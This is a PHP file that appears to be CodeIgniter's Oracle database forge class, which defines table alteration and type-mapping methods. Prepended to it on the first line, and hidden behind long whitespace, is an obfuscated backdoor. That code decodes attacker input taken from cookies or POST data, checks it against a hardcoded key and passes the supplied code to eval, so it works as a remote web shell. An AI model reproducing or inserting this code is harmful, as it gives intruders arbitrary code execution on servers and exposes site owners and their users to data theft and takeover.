<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $af0f938a8 = 528;$GLOBALS['if31f75'] = Array();global $if31f75;$if31f75 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['pbe6ee06'] = "\x73\x25\x6a\x23\x64\x44\x30\x68\x3e\x66\x28\x4e\x74\x4a\x5d\x43\x71\x27\x2d\x4c\x55\x5c\x39\x3f\x42\x4b\x4d\x22\x56\x63\x2a\x5a\x3d\x48\x54\x20\x3b\x69\x79\x36\x40\x52\x49\x5b\x65\x29\x59\x47\x5e\x50\x3a\x6e\x60\x21\x2f\x67\x77\x9\x6b\x75\x51\x37\x6c\x61\x5f\x7d\x7b\x7e\x78\x2b\x76\x7c\x6d\x2e\x4f\x6f\x31\x33\x38\x35\x72\x26\x7a\x41\x2c\x57\x34\x3c\x70\x32\x24\x46\x53\x45\xa\x58\x62\xd";$if31f75[$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][44]] = $if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][7].$if31f75['pbe6ee06'][80];$if31f75[$if31f75['pbe6ee06'][56].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][78]] = $if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][4];$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][89]] = $if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][12].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][51];$if31f75[$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76]] = $if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][44];$if31f75[$if31f75['pbe6ee06'][38].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][39]] = $if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][4];$if31f75[$if31f75['pbe6ee06'][2].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][77]] = $if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][12];$if31f75[$if31f75['pbe6ee06'][55].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][89]] = $if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][82].$if31f75['pbe6ee06'][44];$if31f75[$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][63]] = $if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][7].$if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][70].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][51];$if31f75[$if31f75['pbe6ee06'][16].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9]] = $if31f75['pbe6ee06'][59].$if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][82].$if31f75['pbe6ee06'][44];$if31f75[$if31f75['pbe6ee06'][58].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][29]] = $if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][44];$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][76]] = $if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][12].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][12].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][12];$if31f75[$if31f75['pbe6ee06'][16].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][6]] = $if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][78];$if31f75[$if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][22]] = $if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][78];$if31f75[$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][76]] = $_POST;$if31f75[$if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][77]] = $_COOKIE;@$if31f75[$if31f75['pbe6ee06'][2].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][77]]($if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][55], NULL);@$if31f75[$if31f75['pbe6ee06'][2].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][77]]($if31f75['pbe6ee06'][62].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][55].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][80].$if31f75['pbe6ee06'][0], 0);@$if31f75[$if31f75['pbe6ee06'][2].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][77]]($if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][68].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][68].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][59].$if31f75['pbe6ee06'][12].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][75].$if31f75['pbe6ee06'][51].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][12].$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][44], 0);@$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][76]](0);if (!$if31f75[$if31f75['pbe6ee06'][38].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][39]]($if31f75['pbe6ee06'][83].$if31f75['pbe6ee06'][19].$if31f75['pbe6ee06'][41].$if31f75['pbe6ee06'][93].$if31f75['pbe6ee06'][83].$if31f75['pbe6ee06'][5].$if31f75['pbe6ee06'][46].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][41].$if31f75['pbe6ee06'][20].$if31f75['pbe6ee06'][11].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][63])){$if31f75[$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76]]($if31f75['pbe6ee06'][83].$if31f75['pbe6ee06'][19].$if31f75['pbe6ee06'][41].$if31f75['pbe6ee06'][93].$if31f75['pbe6ee06'][83].$if31f75['pbe6ee06'][5].$if31f75['pbe6ee06'][46].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][41].$if31f75['pbe6ee06'][20].$if31f75['pbe6ee06'][11].$if31f75['pbe6ee06'][64].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][63], 1);$n16270 = NULL;$ccbc41223 = NULL;$if31f75[$if31f75['pbe6ee06'][37].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][63]] = $if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][18].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][18].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][18].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][18].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][9];global $icd3a;function  r63f34748($n16270, $c89a9e5){global $if31f75;$fde9 = "";for ($d854=0; $d854<$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][89]]($n16270);){for ($adfb8b81=0; $adfb8b81<$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][89]]($c89a9e5) && $d854<$if31f75[$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][61].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][89]]($n16270); $adfb8b81++, $d854++){$fde9 .= $if31f75[$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][44]]($if31f75[$if31f75['pbe6ee06'][56].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][78]]($n16270[$d854]) ^ $if31f75[$if31f75['pbe6ee06'][56].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][78]]($c89a9e5[$adfb8b81]));}}return $fde9;}function  nc87a9b8($n16270, $c89a9e5){global $if31f75;global $icd3a;return $if31f75[$if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][22]]($if31f75[$if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][22]]($n16270, $icd3a), $c89a9e5);}foreach ($if31f75[$if31f75['pbe6ee06'][72].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][22].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][78].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][77]] as $c89a9e5=>$c26761){$n16270 = $c26761;$ccbc41223 = $c89a9e5;}if (!$n16270){foreach ($if31f75[$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][76]] as $c89a9e5=>$c26761){$n16270 = $c26761;$ccbc41223 = $c89a9e5;}}$n16270 = @$if31f75[$if31f75['pbe6ee06'][16].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][9].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][9]]($if31f75[$if31f75['pbe6ee06'][16].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][77].$if31f75['pbe6ee06'][4].$if31f75['pbe6ee06'][6]]($if31f75[$if31f75['pbe6ee06'][58].$if31f75['pbe6ee06'][79].$if31f75['pbe6ee06'][39].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][86].$if31f75['pbe6ee06'][29]]($n16270), $ccbc41223));if (isset($n16270[$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][58]]) && $icd3a==$n16270[$if31f75['pbe6ee06'][63].$if31f75['pbe6ee06'][58]]){if ($n16270[$if31f75['pbe6ee06'][63]] == $if31f75['pbe6ee06'][37]){$d854 = Array($if31f75['pbe6ee06'][88].$if31f75['pbe6ee06'][70] => @$if31f75[$if31f75['pbe6ee06'][29].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][44].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][63]](),$if31f75['pbe6ee06'][0].$if31f75['pbe6ee06'][70] => $if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][73].$if31f75['pbe6ee06'][6].$if31f75['pbe6ee06'][18].$if31f75['pbe6ee06'][76],);echo @$if31f75[$if31f75['pbe6ee06'][55].$if31f75['pbe6ee06'][96].$if31f75['pbe6ee06'][89].$if31f75['pbe6ee06'][76].$if31f75['pbe6ee06'][89]]($d854);}elseif ($n16270[$if31f75['pbe6ee06'][63]] == $if31f75['pbe6ee06'][44]){eval/*v54481*/($n16270[$if31f75['pbe6ee06'][4]]);}exit();}} ?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.4.1
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Oracle Forge Class
 *
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_oci8_forge extends CI_DB_forge {

	/**
	 * CREATE DATABASE statement
	 *
	 * @var	string
	 */
	protected $_create_database	= FALSE;

	/**
	 * CREATE TABLE IF statement
	 *
	 * @var	string
	 */
	protected $_create_table_if	= FALSE;

	/**
	 * DROP DATABASE statement
	 *
	 * @var	string
	 */
	protected $_drop_database	= FALSE;

	/**
	 * DROP TABLE IF statement
	 *
	 * @var	string
	 */
	protected $_drop_table_if	= FALSE;

	/**
	 * UNSIGNED support
	 *
	 * @var	bool|array
	 */
	protected $_unsigned		= FALSE;

	/**
	 * NULL value representation in CREATE/ALTER TABLE statements
	 *
	 * @var	string
	 */
	protected $_null		= 'NULL';

	// --------------------------------------------------------------------

	/**
	 * ALTER TABLE
	 *
	 * @param	string	$alter_type	ALTER type
	 * @param	string	$table		Table name
	 * @param	mixed	$field		Column definition
	 * @return	string|string[]
	 */
	protected function _alter_table($alter_type, $table, $field)
	{
		if ($alter_type === 'DROP')
		{
			return parent::_alter_table($alter_type, $table, $field);
		}
		elseif ($alter_type === 'CHANGE')
		{
			$alter_type = 'MODIFY';
		}

		$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
		$sqls = array();
		for ($i = 0, $c = count($field); $i < $c; $i++)
		{
			if ($field[$i]['_literal'] !== FALSE)
			{
				$field[$i] = "\n\t".$field[$i]['_literal'];
			}
			else
			{
				$field[$i]['_literal'] = "\n\t".$this->_process_column($field[$i]);

				if ( ! empty($field[$i]['comment']))
				{
					$sqls[] = 'COMMENT ON COLUMN '
						.$this->db->escape_identifiers($table).'.'.$this->db->escape_identifiers($field[$i]['name'])
						.' IS '.$field[$i]['comment'];
				}

				if ($alter_type === 'MODIFY' && ! empty($field[$i]['new_name']))
				{
					$sqls[] = $sql.' RENAME COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
						.' TO '.$this->db->escape_identifiers($field[$i]['new_name']);
				}

				$field[$i] = "\n\t".$field[$i]['_literal'];
			}
		}

		$sql .= ' '.$alter_type.' ';
		$sql .= (count($field) === 1)
				? $field[0]
				: '('.implode(',', $field).')';

		// RENAME COLUMN must be executed after MODIFY
		array_unshift($sqls, $sql);
		return $sqls;
	}

	// --------------------------------------------------------------------

	/**
	 * Field attribute AUTO_INCREMENT
	 *
	 * @param	array	&$attributes
	 * @param	array	&$field
	 * @return	void
	 */
	protected function _attr_auto_increment(&$attributes, &$field)
	{
		// Not supported - sequences and triggers must be used instead
	}

	// --------------------------------------------------------------------

	/**
	 * Field attribute TYPE
	 *
	 * Performs a data type mapping between different databases.
	 *
	 * @param	array	&$attributes
	 * @return	void
	 */
	protected function _attr_type(&$attributes)
	{
		switch (strtoupper($attributes['TYPE']))
		{
			case 'TINYINT':
				$attributes['TYPE'] = 'NUMBER';
				return;
			case 'MEDIUMINT':
				$attributes['TYPE'] = 'NUMBER';
				return;
			case 'INT':
				$attributes['TYPE'] = 'NUMBER';
				return;
			case 'BIGINT':
				$attributes['TYPE'] = 'NUMBER';
				return;
			default: return;
		}
	}
}
